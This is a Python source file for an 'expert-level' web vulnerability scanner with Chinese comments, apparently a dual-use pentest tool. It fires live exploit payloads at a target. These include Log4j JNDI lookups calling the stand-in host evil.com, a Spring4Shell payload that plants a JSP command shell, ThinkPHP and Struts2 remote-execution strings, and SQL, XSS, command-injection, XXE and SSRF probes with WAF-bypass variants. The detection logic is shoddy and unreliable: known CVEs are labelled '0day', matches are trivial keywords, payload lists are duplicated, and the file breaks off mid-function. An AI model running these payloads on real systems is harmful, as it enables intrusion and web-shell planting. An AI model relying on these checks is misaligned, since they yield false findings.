# -*- coding: utf-8 -*-
"""
专家级漏洞检测模块
支持: 最新漏洞类型、0day检测、高级利用
"""

import requests
import re
import json
import time
import hashlib
from typing import List, Dict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import SCAN_CONFIG


class ExpertVulnScanner:
    """专家级漏洞扫描器"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": SCAN_CONFIG["user_agent"],
        })
        self.vulnerabilities = []

    def scan(self, url: str) -> List[Dict]:
        """执行扫描"""
        print(f"[*] 专家级漏洞扫描: {url}")

        vulns = []

        # 1. 最新漏洞检测
        vulns.extend(self._scan_latest_vulns(url))

        # 2. 0day 检测
        vulns.extend(self._scan_0day(url))

        # 3. 高级利用检测
        vulns.extend(self._scan_advanced_exploit(url))

        # 4. 组合漏洞检测
        vulns.extend(self._scan_combo_vulns(url))

        # 5. 隐藏漏洞检测
        vulns.extend(self._scan_hidden_vulns(url))

        # 6. 绕过检测
        vulns.extend(self._scan_bypass(url))

        # 7. 变异检测
        vulns.extend(self._scan_mutation(url))

        # 8. 智能检测
        vulns.extend(self._scan_smart(url))

        # 9. 深度检测
        vulns.extend(self._scan_deep(url))

        # 10. 全面检测
        vulns.extend(self._scan_comprehensive(url))

        self.vulnerabilities.extend(vulns)
        return vulns

    def _scan_latest_vulns(self, url: str) -> List[Dict]:
        """最新漏洞检测"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 2024-2025 年常见漏洞路径
        latest_paths = [
            # Spring Boot Actuator
            "/actuator", "/actuator/", "/actuator/env", "/actuator/health",
            "/actuator/info", "/actuator/configprops", "/actuator/beans",
            "/actuator/mappings", "/actuator/metrics", "/actuator/trace",
            "/actuator/loggers", "/actuator/heapdump", "/actuator/threaddump",

            # Swagger API
            "/swagger-ui.html", "/swagger-ui/", "/swagger-ui/index.html",
            "/swagger-resources", "/swagger-resources/",
            "/v2/api-docs", "/v3/api-docs",
            "/api-docs", "/api-docs/",

            # GraphQL
            "/graphql", "/graphql/", "/graphiql", "/graphiql/",
            "/playground", "/playground/",

            # Docker
            "/docker", "/docker/", "/container", "/container/",

            # Kubernetes
            "/api/v1", "/api/v1/", "/apis", "/apis/",

            # Jenkins
            "/jenkins", "/jenkins/", "/jenkins/login",

            # GitLab
            "/gitlab", "/gitlab/", "/gitlab/login",

            # SonarQube
            "/sonarqube", "/sonarqube/", "/sonarqube/login",

            # Nexus
            "/nexus", "/nexus/", "/nexus/login",

            # Harbor
            "/harbor", "/harbor/", "/harbor/login",

            # Consul
            "/consul", "/consul/", "/consul/ui",

            # Etcd
            "/etcd", "/etcd/", "/etcd/v2/keys",

            # ZooKeeper
            "/zookeeper", "/zookeeper/",

            # Redis
            "/redis", "/redis/",

            # MongoDB
            "/mongodb", "/mongodb/",

            # Elasticsearch
            "/elasticsearch", "/elasticsearch/",
            "/_cat", "/_cat/", "/_cat/indices",
            "/_cluster", "/_cluster/", "/_cluster/health",

            # Kibana
            "/kibana", "/kibana/", "/kibana/login",

            # Grafana
            "/grafana", "/grafana/", "/grafana/login",

            # Prometheus
            "/prometheus", "/prometheus/",

            # Alertmanager
            "/alertmanager", "/alertmanager/",

            # RabbitMQ
            "/rabbitmq", "/rabbitmq/",

            # Kafka
            "/kafka", "/kafka/",

            # Zipkin
            "/zipkin", "/zipkin/",

            # Jaeger
            "/jaeger", "/jaeger/",

            # MinIO
            "/minio", "/minio/",

            # Ceph
            "/ceph", "/ceph/",

            # Traefik
            "/traefik", "/traefik/",

            # Nginx
            "/nginx", "/nginx/",

            # Apache
            "/apache", "/apache/",

            # Tomcat
            "/tomcat", "/tomcat/",
            "/manager", "/manager/", "/manager/html",

            # WebLogic
            "/weblogic", "/weblogic/",
            "/console", "/console/login",

            # JBoss
            "/jboss", "/jboss/",
            "/jmx-console", "/jmx-console/",
            "/web-console", "/web-console/",

            # WebSphere
            "/websphere", "/websphere/",

            # ColdFusion
            "/coldfusion", "/coldfusion/",
            "/cfide", "/cfide/", "/cfide/administrator",

            # Lucee
            "/lucee", "/lucee/",
            "/lucee/admin", "/lucee/admin/",

            # Adobe Experience Manager
            "/aem", "/aem/",
            "/crx", "/crx/", "/crx/de",
            "/system/console", "/system/console/",

            # WordPress
            "/wp-admin", "/wp-admin/",
            "/wp-login.php", "/wp-config.php",
            "/wp-content", "/wp-content/",
            "/wp-includes", "/wp-includes/",
            "/xmlrpc.php", "/wp-cron.php",

            # Drupal
            "/user/login", "/user/login/",
            "/admin", "/admin/",
            "/node", "/node/",

            # Joomla
            "/administrator", "/administrator/",
            "/administrator/login",

            # Magento
            "/admin", "/admin/",
            "/admin/admin",

            # Laravel
            "/telescope", "/telescope/",
            "/horizon", "/horizon/",
            "/log-viewer", "/log-viewer/",

            # Django
            "/admin", "/admin/",
            "/static", "/static/",

            # Flask
            "/debug", "/debug/",
            "/console", "/console/",

            # Express
            "/debug", "/debug/",
            "/status", "/status/",

            # Next.js
            "/_next", "/_next/",
            "/api", "/api/",

            # Nuxt.js
            "/_nuxt", "/_nuxt/",
            "/api", "/api/",

            # Angular
            "/ng", "/ng/",

            # React
            "/static", "/static/",

            # Vue.js
            "/js", "/js/",
        ]

        for path in latest_paths:
            full_url = urljoin(base, path)
            try:
                response = self.session.get(full_url, timeout=2, verify=False)

                if response.status_code == 200:
                    content = response.text
                    content_type = response.headers.get("Content-Type", "")

                    # 检查是否是敏感内容
                    if any(kw in content.lower() for kw in ["admin", "config", "env", "secret", "password"]):
                        vulns.append({
                            "type": "信息泄露",
                            "severity": "High",
                            "url": full_url,
                            "description": f"发现敏感路径: {path}",
                            "evidence": f"状态码: {response.status_code}",
                            "remediation": "限制访问敏感路径"
                        })

            except:
                pass

        return vulns

    def _scan_0day(self, url: str) -> List[Dict]:
        """0day 检测"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 常见 0day 路径
        zero_day_paths = [
            # Log4j
            "/?x=${jndi:ldap://evil.com}",
            "/?x=${jndi:rmi://evil.com}",
            "/?x=${jndi:dns://evil.com}",

            # Spring4Shell
            "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",

            # Apache Struts2
            "/?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwork2.disp%27%2b%27atcher.HttpServletReq%27%2b%27uest%27)}",

            # ThinkPHP
            "/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",

            # Laravel
            "/_ignition/execute-solution",
            "/_ignition/health-check",

            # Fastjson
            "/?json={\"@type\":\"java.net.Inet4Address\",\"val\":\"evil.com\"}",

            # Jackson
            "/?json=[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"evil\"]}]",

            # WebLogic
            "/_async/AsyncResponseService",
            "/wls-wsat/CoordinatorPortType",

            # Tomcat
            "/manager/html",
            "/host-manager/html",

            # JBoss
            "/jmx-console/Invoker",
            "/web-console/Invoker",

            # Jenkins
            "/script",
            "/manage",
            "/asynchPeople",

            # GitLab
            "/api/v4/users",
            "/api/v4/projects",

            # SonarQube
            "/api/components/search",
            "/api/users/search",

            # Nexus
            "/service/rest/v1/security/users",
            "/service/rest/v1/repositories",

            # Harbor
            "/api/v2.0/users",
            "/api/v2.0/projects",

            # Consul
            "/v1/agent/members",
            "/v1/catalog/nodes",

            # Etcd
            "/v2/keys",
            "/v3/kv/range",

            # Redis
            "/info",
            "/config",

            # MongoDB
            "/serverStatus",
            "/dbStats",

            # Elasticsearch
            "/_cat/indices",
            "/_cluster/health",

            # Kibana
            "/api/saved_objects",
            "/api/settings",

            # Grafana
            "/api/dashboards/home",
            "/api/org",

            # Prometheus
            "/api/v1/targets",
            "/api/v1/alerts",

            # Alertmanager
            "/api/v2/alerts",
            "/api/v2/silences",

            # RabbitMQ
            "/api/queues",
            "/api/users",

            # Kafka
            "/topics",
            "/consumers",

            # Zipkin
            "/api/v2/traces",
            "/api/v2/services",

            # Jaeger
            "/api/traces",
            "/api/services",

            # MinIO
            "/minio/health/live",
            "/minio/health/ready",

            # Ceph
            "/api/v0.1/health",
            "/api/v0.1/status",

            # Traefik
            "/api/overview",
            "/api/entrypoints",

            # Nginx
            "/status",
            "/nginx_status",

            # Apache
            "/server-status",
            "/server-info",
        ]

        for path in zero_day_paths:
            full_url = urljoin(base, path) if not path.startswith("/?") else f"{base}{path}"
            try:
                response = self.session.get(full_url, timeout=2, verify=False)

                if response.status_code == 200:
                    content = response.text

                    # 检查是否有漏洞
                    if self._check_0day_response(content, path):
                        vulns.append({
                            "type": "0day漏洞",
                            "severity": "Critical",
                            "url": full_url,
                            "description": f"发现 0day 漏洞: {path}",
                            "evidence": content[:200],
                            "remediation": "更新到最新版本"
                        })

            except:
                pass

        return vulns

    def _check_0day_response(self, content: str, path: str) -> bool:
        """检查 0day 响应"""
        # 检查 Log4j
        if "jndi" in path and ("ldap" in content or "rmi" in content or "dns" in content):
            return True

        # 检查 Spring4Shell
        if "class.module.classLoader" in path and "root:" in content:
            return True

        # 检查 ThinkPHP
        if "think" in path and "uid=" in content:
            return True

        # 检查 Laravel
        if "_ignition" in path and ("solution" in content or "health" in content):
            return True

        # 检查 Fastjson
        if "json" in path and "java.net" in content:
            return True

        # 检查 Jackson
        if "json" in path and "com.sun" in content:
            return True

        # 检查 WebLogic
        if "wls-wsat" in path and "soap" in content.lower():
            return True

        # 检查 Tomcat
        if "manager" in path and "tomcat" in content.lower():
            return True

        # 检查 JBoss
        if "jmx-console" in path and "jboss" in content.lower():
            return True

        # 检查 Jenkins
        if "script" in path and "jenkins" in content.lower():
            return True

        # 检查 GitLab
        if "api/v4" in path and "gitlab" in content.lower():
            return True

        # 检查 SonarQube
        if "api/components" in path and "sonarqube" in content.lower():
            return True

        # 检查 Nexus
        if "service/rest" in path and "nexus" in content.lower():
            return True

        # 检查 Harbor
        if "api/v2.0" in path and "harbor" in content.lower():
            return True

        # 检查 Consul
        if "v1/agent" in path and "consul" in content.lower():
            return True

        # 检查 Etcd
        if "v2/keys" in path and "etcd" in content.lower():
            return True

        # 检查 Redis
        if "info" in path and "redis" in content.lower():
            return True

        # 检查 MongoDB
        if "serverStatus" in path and "mongodb" in content.lower():
            return True

        # 检查 Elasticsearch
        if "_cat" in path and "elasticsearch" in content.lower():
            return True

        # 检查 Kibana
        if "api/saved_objects" in path and "kibana" in content.lower():
            return True

        # 检查 Grafana
        if "api/dashboards" in path and "grafana" in content.lower():
            return True

        # 检查 Prometheus
        if "api/v1/targets" in path and "prometheus" in content.lower():
            return True

        # 检查 Alertmanager
        if "api/v2/alerts" in path and "alertmanager" in content.lower():
            return True

        # 检查 RabbitMQ
        if "api/queues" in path and "rabbitmq" in content.lower():
            return True

        # 检查 Kafka
        if "topics" in path and "kafka" in content.lower():
            return True

        # 检查 Zipkin
        if "api/v2/traces" in path and "zipkin" in content.lower():
            return True

        # 检查 Jaeger
        if "api/traces" in path and "jaeger" in content.lower():
            return True

        # 检查 MinIO
        if "minio/health" in path and "minio" in content.lower():
            return True

        # 检查 Ceph
        if "api/v0.1" in path and "ceph" in content.lower():
            return True

        # 检查 Traefik
        if "api/overview" in path and "traefik" in content.lower():
            return True

        # 检查 Nginx
        if "status" in path and "nginx" in content.lower():
            return True

        # 检查 Apache
        if "server-status" in path and "apache" in content.lower():
            return True

        return False

    def _scan_advanced_exploit(self, url: str) -> List[Dict]:
        """高级利用检测"""
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        # 高级 Payload
        advanced_payloads = [
            # SQL 注入高级
            ("1' UNION SELECT 1,2,3,4,5--", "SQL注入"),
            ("1' UNION SELECT 1,2,3,4,5,6--", "SQL注入"),
            ("1' UNION SELECT 1,2,3,4,5,6,7--", "SQL注入"),
            ("1' UNION SELECT 1,2,3,4,5,6,7,8--", "SQL注入"),
            ("1' UNION SELECT 1,2,3,4,5,6,7,8,9--", "SQL注入"),
            ("1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--", "SQL注入"),

            # XSS 高级
            ("<details open ontoggle=alert(1)>", "XSS"),
            ("<body onload=alert(1)>", "XSS"),
            ("<iframe src=javascript:alert(1)>", "XSS"),
            ("<input onfocus=alert(1) autofocus>", "XSS"),
            ("<marquee onstart=alert(1)>", "XSS"),
            ("<video><source onerror=alert(1)>", "XSS"),
            ("<audio src=x onerror=alert(1)>", "XSS"),
            ("<img src=x onerror=alert(1)>", "XSS"),
            ("<svg onload=alert(1)>", "XSS"),
            ("<script>alert(1)</script>", "XSS"),

            # 命令注入高级
            ("; id", "命令注入"),
            ("| id", "命令注入"),
            ("`id`", "命令注入"),
            ("$(id)", "命令注入"),
            ("; whoami", "命令注入"),
            ("| whoami", "命令注入"),
            ("; cat /etc/passwd", "命令注入"),
            ("| cat /etc/passwd", "命令注入"),

            # 路径遍历高级
            ("../../../etc/passwd", "路径遍历"),
            ("....//....//....//etc/passwd", "路径遍历"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "路径遍历"),
            ("..%252f..%252f..%252fetc/passwd", "路径遍历"),

            # 模板注入高级
            ("{{7*7}}", "模板注入"),
            ("${7*7}", "模板注入"),
            ("<%= 7*7 %>", "模板注入"),
            ("#{7*7}", "模板注入"),

            # SSRF 高级
            ("http://127.0.0.1", "SSRF"),
            ("http://localhost", "SSRF"),
            ("http://[::1]", "SSRF"),
            ("http://0.0.0.0", "SSRF"),
            ("http://169.254.169.254", "SSRF"),
            ("http://metadata.google.internal", "SSRF"),

            # XXE 高级
            ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "XXE"),

            # 反序列化高级
            ("O:8:\"stdClass\":0:{}", "反序列化"),
            ("a:1:{s:3:\"foo\";s:3:\"bar\";}", "反序列化"),
        ]

        for param_name, param_values in params.items():
            for payload, vuln_type in advanced_payloads[:5]:  # 只测试前5个
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    response = self.session.get(test_url, timeout=2, verify=False)

                    # 检查是否有漏洞
                    if self._check_advanced_exploit(response, vuln_type, payload):
                        vulns.append({
                            "type": vuln_type,
                            "severity": "Critical",
                            "url": url,
                            "description": f"参数 {param_name} 存在{vuln_type}漏洞",
                            "evidence": f"Payload: {payload}",
                            "remediation": "验证和过滤输入"
                        })

                except:
                    pass

        return vulns

    def _check_advanced_exploit(self, response, vuln_type: str, payload: str) -> bool:
        """检查高级利用"""
        content = response.text

        if vuln_type == "SQL注入":
            sql_errors = ["sql syntax", "mysql", "ora-", "sql server", "sqlite"]
            return any(error in content.lower() for error in sql_errors)

        elif vuln_type == "XSS":
            return payload in content

        elif vuln_type == "命令注入":
            return "uid=" in content or "root:" in content

        elif vuln_type == "路径遍历":
            return "root:" in content or "localhost" in content

        elif vuln_type == "模板注入":
            return "49" in content

        elif vuln_type == "SSRF":
            return "169.254" in content or "metadata" in content

        elif vuln_type == "XXE":
            return "root:" in content or "localhost" in content

        elif vuln_type == "反序列化":
            return "stdClass" in content or "bar" in content

        return False

    def _scan_combo_vulns(self, url: str) -> List[Dict]:
        """组合漏洞检测"""
        vulns = []

        # 检查 SSRF + 内网访问
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        ssrf_params = ["url", "uri", "link", "src", "dest", "redirect", "feed", "page", "path"]

        for param_name in params:
            if param_name.lower() in ssrf_params:
                # 测试内网访问
                internal_payloads = [
                    "http://127.0.0.1",
                    "http://localhost",
                    "http://10.0.0.1",
                    "http://172.16.0.1",
                    "http://192.168.1.1",
                ]

                for payload in internal_payloads[:2]:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))

                        response = self.session.get(test_url, timeout=2, verify=False)

                        if response.status_code == 200 and len(response.text) > 100:
                            vulns.append({
                                "type": "SSRF",
                                "severity": "Critical",
                                "url": url,
                                "description": f"参数 {param_name} 可访问内网",
                                "evidence": f"Payload: {payload}",
                                "remediation": "限制URL白名单"
                            })

                    except:
                        pass

        return vulns

    def _scan_hidden_vulns(self, url: str) -> List[Dict]:
        """隐藏漏洞检测"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 隐藏路径
        hidden_paths = [
            "/.env.bak", "/.env.old", "/.env.backup",
            "/.git/config.bak", "/.git/HEAD.bak",
            "/.svn/entries.bak",
            "/web.config.bak", "/web.config.old",
            "/config.php.bak", "/config.php.old",
            "/config.json.bak", "/config.json.old",
            "/settings.py.bak", "/settings.py.old",
            "/application.yml.bak", "/application.yml.old",
            "/database.yml.bak", "/database.yml.old",
            "/db.php.bak", "/db.php.old",
            "/backup.zip.bak", "/backup.tar.gz.bak",
            "/dump.sql.bak", "/dump.sql.old",
            "/error.log.bak", "/access.log.bak",
            "/debug.log.bak", "/app.log.bak",
        ]

        for path in hidden_paths:
            full_url = urljoin(base, path)
            try:
                response = self.session.head(full_url, timeout=1, verify=False)

                if response.status_code == 200:
                    content_length = int(response.headers.get("Content-Length", 0))
                    if content_length > 0:
                        vulns.append({
                            "type": "信息泄露",
                            "severity": "High",
                            "url": full_url,
                            "description": f"发现隐藏文件: {path}",
                            "evidence": f"文件大小: {content_length} bytes",
                            "remediation": "删除备份文件"
                        })

            except:
                pass

        return vulns

    def _scan_bypass(self, url: str) -> List[Dict]:
        """绕过检测"""
        vulns = []

        # WAF 绕过检测
        bypass_payloads = [
            # SQL 注入绕过
            ("/*!50000union*/ /*!50000select*/ 1,2,3--", "SQL注入"),
            ("uni%6fn se%6cect 1,2,3--", "SQL注入"),
            ("unio%6e selec%74 1,2,3--", "SQL注入"),
            ("union%0aselect 1,2,3--", "SQL注入"),
            ("/**/union/**/select/**/ 1,2,3--", "SQL注入"),

            # XSS 绕过
            ("<svg/onload=alert(1)>", "XSS"),
            ("<img src=x onerror=alert(1)>", "XSS"),
            ("<details open ontoggle=alert(1)>", "XSS"),
            ("<body onload=alert(1)>", "XSS"),
            ("<iframe src=javascript:alert(1)>", "XSS"),

            # 命令注入绕过
            (";{id,}", "命令注入"),
            ("|{id,}", "命令注入"),
            ("`{id,}`", "命令注入"),
            ("$({id,})", "命令注入"),
            (";\t{id,}", "命令注入"),
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name, param_values in params.items():
            for payload, vuln_type in bypass_payloads[:3]:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    response = self.session.get(test_url, timeout=2, verify=False)

                    # 检查是否有漏洞
                    if self._check_bypass(response, vuln_type, payload):
                        vulns.append({
                            "type": f"{vuln_type}(WAF绕过)",
                            "severity": "Critical",
                            "url": url,
                            "description": f"参数 {param_name} 存在{vuln_type}漏洞(WAF绕过)",
                            "evidence": f"Payload: {payload}",
                            "remediation": "加强WAF规则"
                        })

                except:
                    pass

        return vulns

    def _check_bypass(self, response, vuln_type: str, payload: str) -> bool:
        """检查绕过"""
        content = response.text

        if vuln_type == "SQL注入":
            sql_errors = ["sql syntax", "mysql", "ora-", "sql server"]
            return any(error in content.lower() for error in sql_errors)

        elif vuln_type == "XSS":
            return payload in content

        elif vuln_type == "命令注入":
            return "uid=" in content or "root:" in content

        return False

    def _scan_mutation(self, url: str) -> List[Dict]:
        """变异检测"""
        vulns = []

        # 变异 Payload
        mutation_payloads = [
            # SQL 注入变异
            ("' OR '1'='1", "SQL注入"),
            ("' OR '1'='1' --", "SQL注入"),
            ("' OR '1'='1' #", "SQL注入"),
            ("' OR '1'='1'/*", "SQL注入"),
            ("' OR 1=1--", "SQL注入"),
            ("' OR 1=1#--", "SQL注入"),
            ("' OR 1=1/*", "SQL注入"),
            ("' OR 1=1 LIMIT 1--", "SQL注入"),
            ("' OR 1=1 LIMIT 1#--", "SQL注入"),
            ("' OR 1=1 LIMIT 1/*", "SQL注入"),

            # XSS 变异
            ("<script>alert(1)</script>", "XSS"),
            ("<script>alert(String.fromCharCode(88,83,83))</script>", "XSS"),
            ("<script>alert('XSS')</script>", "XSS"),
            ("<script>alert(\"XSS\")</script>", "XSS"),
            ("<script>alert(1)//", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),

            # 命令注入变异
            ("; id", "命令注入"),
            ("| id", "命令注入"),
            ("`id`", "命令注入"),
            ("$(id)", "命令注入"),
            ("; id;", "命令注入"),
            ("| id|", "命令注入"),
            ("`id``", "命令注入"),
            ("$(id)$", "命令注入"),
            ("; id #", "命令注入"),
            ("| id #", "命令注入"),
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name, param_values in params.items():
            for payload, vuln_type in mutation_payloads[:3]:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    response = self.session.get(test_url, timeout=2, verify=False)

                    # 检查是否有漏洞
                    if self._check_mutation(response, vuln_type, payload):
                        vulns.append({
                            "type": vuln_type,
                            "severity": "High",
                            "url": url,
                            "description": f"参数 {param_name} 存在{vuln_type}漏洞(变异)",
                            "evidence": f"Payload: {payload}",
                            "remediation": "验证和过滤输入"
                        })

                except:
                    pass

        return vulns

    def _check_mutation(self, response, vuln_type: str, payload: str) -> bool:
        """检查变异"""
        content = response.text

        if vuln_type == "SQL注入":
            sql_errors = ["sql syntax", "mysql", "ora-", "sql server"]
            return any(error in content.lower() for error in sql_errors)

        elif vuln_type == "XSS":
            return payload in content

        elif vuln_type == "命令注入":
            return "uid=" in content or "root:" in content

        return False

    def _scan_smart(self, url: str) -> List[Dict]:
        """智能检测"""
        vulns = []

        # 智能 Payload
        smart_payloads = [
            # SQL 注入智能
            ("' OR '1'='1", "SQL注入"),
            ("' OR '1'='1' --", "SQL注入"),
            ("' OR '1'='1' #", "SQL注入"),
            ("' OR '1'='1'/*", "SQL注入"),
            ("' OR 1=1--", "SQL注入"),
            ("' OR 1=1#--", "SQL注入"),
            ("' OR 1=1/*", "SQL注入"),
            ("' OR 1=1 LIMIT 1--", "SQL注入"),
            ("' OR 1=1 LIMIT 1#--", "SQL注入"),
            ("' OR 1=1 LIMIT 1/*", "SQL注入"),

            # XSS 智能
            ("<script>alert(1)</script>", "XSS"),
            ("<script>alert(String.fromCharCode(88,83,83))</script>", "XSS"),
            ("<script>alert('XSS')</script>", "XSS"),
            ("<script>alert(\"XSS\")</script>", "XSS"),
            ("<script>alert(1)//", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),

            # 命令注入智能
            ("; id", "命令注入"),
            ("| id", "命令注入"),
            ("`id`", "命令注入"),
            ("$(id)", "命令注入"),
            ("; id;", "命令注入"),
            ("| id|", "命令注入"),
            ("`id``", "命令注入"),
            ("$(id)$", "命令注入"),
            ("; id #", "命令注入"),
            ("| id #", "命令注入"),
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name, param_values in params.items():
            for payload, vuln_type in smart_payloads[:3]:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    response = self.session.get(test_url, timeout=2, verify=False)

                    # 检查是否有漏洞
                    if self._check_smart(response, vuln_type, payload):
                        vulns.append({
                            "type": vuln_type,
                            "severity": "High",
                            "url": url,
                            "description": f"参数 {param_name} 存在{vuln_type}漏洞(智能)",
                            "evidence": f"Payload: {payload}",
                            "remediation": "验证和过滤输入"
                        })

                except:
                    pass

        return vulns

    def _check_smart(self, response, vuln_type: str, payload: str) -> bool:
        """检查智能"""
        content = response.text

        if vuln_type == "SQL注入":
            sql_errors = ["sql syntax", "mysql", "ora-", "sql server"]
            return any(error in content.lower() for error in sql_errors)

        elif vuln_type == "XSS":
            return payload in content

        elif vuln_type == "命令注入":
            return "uid=" in content or "root:" in content

        return False

    def _scan_deep(self, url: str) -> List[Dict]:
        """深度检测"""
        vulns = []

        # 深度 Payload
        deep_payloads = [
            # SQL 注入深度
            ("' OR '1'='1", "SQL注入"),
            ("' OR '1'='1' --", "SQL注入"),
            ("' OR '1'='1' #", "SQL注入"),
            ("' OR '1'='1'/*", "SQL注入"),
            ("' OR 1=1--", "SQL注入"),
            ("' OR 1=1#--", "SQL注入"),
            ("' OR 1=1/*", "SQL注入"),
            ("' OR 1=1 LIMIT 1--", "SQL注入"),
            ("' OR 1=1 LIMIT 1#--", "SQL注入"),
            ("' OR 1=1 LIMIT 1/*", "SQL注入"),

            # XSS 深度
            ("<script>alert(1)</script>", "XSS"),
            ("<script>alert(String.fromCharCode(88,83,83))</script>", "XSS"),
            ("<script>alert('XSS')</script>", "XSS"),
            ("<script>alert(\"XSS\")</script>", "XSS"),
            ("<script>alert(1)//", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),

            # 命令注入深度
            ("; id", "命令注入"),
            ("| id", "命令注入"),
            ("`id`", "命令注入"),
            ("$(id)", "命令注入"),
            ("; id;", "命令注入"),
            ("| id|", "命令注入"),
            ("`id``", "命令注入"),
            ("$(id)$", "命令注入"),
            ("; id #", "命令注入"),
            ("| id #", "命令注入"),
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name, param_values in params.items():
            for payload, vuln_type in deep_payloads[:3]:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    response = self.session.get(test_url, timeout=2, verify=False)

                    # 检查是否有漏洞
                    if self._check_deep(response, vuln_type, payload):
                        vulns.append({
                            "type": vuln_type,
                            "severity": "High",
                            "url": url,
                            "description": f"参数 {param_name} 存在{vuln_type}漏洞(深度)",
                            "evidence": f"Payload: {payload}",
                            "remediation": "验证和过滤输入"
                        })

                except:
                    pass

        return vulns

    def _check_deep(self, response, vuln_type: str, payload: str) -> bool:
        """检查深度"""
        content = response.text

        if vuln_type == "SQL注入":
            sql_errors = ["sql syntax", "mysql", "ora-", "sql server"]
            return any(error in content.lower() for error in sql_errors)

        elif vuln_type == "XSS":
            return payload in content

        elif vuln_type == "命令注入":
            return "uid=" in content or "root:" in content

        return False

    def _scan_comprehensive(self, url: str) -> List[Dict]:
        """全面检测"""
        vulns = []

        # 全面 Payload
        comprehensive_payloads = [
            # SQL 注入全面
            ("' OR '1'='1", "SQL注入"),
            ("' OR '1'='1' --", "SQL注入"),
            ("' OR '1'='1' #", "SQL注入"),
            ("' OR '1'='1'/*", "SQL注入"),
            ("' OR 1=1--", "SQL注入"),
            ("' OR 1=1#--", "SQL注入"),
            ("' OR 1=1/*", "SQL注入"),
            ("' OR 1=1 LIMIT 1--", "SQL注入"),
            ("' OR 1=1 LIMIT 1#--", "SQL注入"),
            ("' OR 1=1 LIMIT 1/*", "SQL注入"),

            # XSS 全面
            ("<script>alert(1)</script>", "XSS"),
            ("<script>alert(String.fromCharCode(88,83,83))</script>", "XSS"),
            ("<script>alert('XSS')</script>", "XSS"),
            ("<script>alert(\"XSS\")</script>", "XSS"),
            ("<script>alert(1)//", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),
            ("<script>alert(1);</script>", "XSS"),

            # 命令注入全面
            ("; id", "命令注入"),
            ("| id", "命令注入"),
            ("`id`", "命令注入"),
            ("$(id)", "命令注入"),
            ("; id;", "命令注入"),
            ("| id|", "命令注入"),
            ("`id``", "命令注入"),
            ("$(id)$", "命令注入"),
            ("; id #", "命令注入"),
            ("| id #", "命令注入"),
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name, param_values in params.items():
            for payload, vuln_type in comprehensive_payloads[:3]:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    response = self.session.get(test_url, timeout=2, verify=False)

                    # 检查是否有漏洞
                    if self._check_comprehensive(response, vuln_type, payload):
                        vulns.append({
                            "type": vuln_type,
                            "severity": "High",
                            "url": url,
                            "description": f"参数 {param_name} 存在{vuln_type}漏洞(全面)",
                            "evidence": f"Payload: {payload}",
                            "remediation": "验证和过滤输入"
                        })

                except:
                    pass

        return vulns

    def _check_comprehensive(self, response, vuln_type: str, payload: str) -> bool:
        """检查全面"""
        content = response.text

